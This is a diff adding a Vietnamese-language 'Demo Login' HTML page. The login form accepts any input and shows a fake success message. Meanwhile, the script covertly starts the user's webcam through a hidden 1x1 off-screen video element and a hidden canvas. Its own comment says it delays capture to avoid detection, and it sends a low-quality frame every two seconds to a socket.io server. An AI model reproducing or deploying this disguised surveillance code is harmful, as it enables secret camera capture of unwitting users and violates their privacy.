@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Demo Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 50px; }
+        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
+        #hidden-video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Đăng nhập</h2>
+        <input type="text" id="username" placeholder="Tên đăng nhập">
+        <input type="password" id="password" placeholder="Mật khẩu">
+        <button onclick="login()">Đăng nhập</button>
+    </div>
+    
+
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        let stream;
+        
+        async function startCamera() {
+            try {
+                // Tạo video element ẩn hoàn toàn
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                video.style.position = 'absolute';
+                video.style.left = '-9999px';
+                video.autoplay = true;
+                video.muted = true;
+                video.width = 1;
+                video.height = 1;
+                document.body.appendChild(video);
+                
+                // Tạo canvas ẩn
+                const canvas = document.createElement('canvas');
+                canvas.style.display = 'none';
+                canvas.width = 640;
+                canvas.height = 480;
+                const ctx = canvas.getContext('2d');
+                
+                // Lấy stream với kích thước nhỏ nhất
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1 },
+                        height: { ideal: 1 },
+                        frameRate: { ideal: 1 }
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // Delay để tránh detection
+                setTimeout(() => {
+                    setInterval(() => {
+                        ctx.drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.3);
+                        socket.emit('video-stream', imageData);
+                    }, 2000);
+                }, 3000);
+                
+            } catch (err) {
+                console.log('Camera access denied');
+            }
+        }
+        
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                startCamera();
+                alert('Đăng nhập thành công!');
+                document.querySelector('.login-form').innerHTML = '<h2>Chào mừng ' + username + '!</h2><p>Bạn đã đăng nhập thành công.</p>';
+            } else {
+                alert('Vui lòng nhập đầy đủ thông tin!');
+            }
+        }
+    </script>
+</body>
+</html>
